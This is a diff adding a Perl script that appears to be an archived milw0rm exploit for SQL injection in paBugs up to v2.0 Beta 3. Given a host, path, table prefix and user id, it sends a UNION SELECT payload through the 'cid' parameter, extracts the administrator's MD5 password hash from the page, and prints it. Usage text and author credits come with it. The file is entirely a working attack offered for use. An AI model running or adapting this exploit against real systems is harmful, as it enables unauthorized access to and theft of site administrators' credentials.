@@ -1,0 +1,41 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use HTTP::Cookies;
+
+if(@ARGV < 4)
+{
+    usage();
+    exit();
+}
+
+$host = $ARGV[0]; # Host
+$path = $ARGV[1]; # Path to paBugs directory
+$pref = $ARGV[2]; # prefix for admin tables
+$usid = $ARGV[3]; # user id
+
+$www = new LWP::UserAgent;
+$sql = "$host/$path/index.php?cid=1'+union+select+1,2,3,password,5+from+$pref\_admins+where+id=$usid/*";
+print "\n\n [~] Searching password for user(admin)=$usid \n";
+$res = $www -> get($sql) or err();
+$res -> content() =~ /([0-9,a-f]{32})/ or err();
+print "\n [+] Admin Password(md5)=$usid is: $1 \n\n";
+
+sub usage()
+{
+print "~---------------------------------------------------------~\n";
+print "|                  Bug Found by: umpi                 |\n";
+print "~---------------------------------------------------------~\n";
+print "|    paBugs <= v2.0 Beta 3 Sql-Injection exploit          |\n";
+print "| Usage: pabugs.pl [site] [folder] [prefix] [user_id] |\n";
+print "| Example: pabugs.pl http://localhost /pabugs pa 1              |\n";
+print "| Coded by p-range   // cf-team.net   // p-range.info     |\n";
+print "~---------------------------------------------------------~\n";
+}
+
+sub err()
+{
+print "\n [-] Site is not vulnerable !";
+exit();
+}
+
+# milw0rm.com [2007-08-02]
